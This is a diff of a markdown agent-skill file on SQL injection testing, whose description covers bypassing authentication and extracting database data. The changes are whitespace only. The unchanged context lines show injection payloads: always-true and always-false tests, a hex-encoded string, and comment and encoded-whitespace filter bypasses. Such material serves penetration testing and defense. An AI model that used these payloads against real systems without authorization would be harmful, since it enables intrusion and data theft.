@@ -2,8 +2,8 @@
 name: SQL Injection Testing
 description: This skill should be used when the user asks to "test for SQL injection vulnerabilities", "perform SQLi attacks", "bypass authentication using SQL injection", "extract database information through injection", "detect SQL injection flaws", or "exploit database query vulnerabilities". It provides comprehensive techniques for identifying, exploiting, and understanding SQL injection attack vectors across different database systems.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # SQL Injection Testing
@@ -98,7 +98,7 @@ page.asp?id=1 or 1=1
 page.asp?id=1' or 1=1--
 page.asp?id=1" or 1=1--
 
--- False condition tests  
+-- False condition tests 
 page.asp?id=1 and 1=2
 page.asp?id=1' and 1=2--
 ```
@@ -232,7 +232,7 @@ U+0027 (apostrophe)
 U+02B9 (modifier letter prime)
 
 -- Hexadecimal strings (MySQL)
-SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' in hex
+SELECT * FROM users WHERE name=0x61646D696E -- 'admin' in hex
 ```
 
 #### Whitespace Bypass
@@ -244,8 +244,8 @@ SELECT/**/username/**/FROM/**/users
 SEL/**/ECT/**/username/**/FR/**/OM/**/users
 
 -- Alternative whitespace
-SELECT%09username%09FROM%09users  -- Tab character
-SELECT%0Ausername%0AFROM%0Ausers  -- Newline
+SELECT%09username%09FROM%09users -- Tab character
+SELECT%0Ausername%0AFROM%0Ausers -- Newline
 ```
 
 #### Keyword Bypass
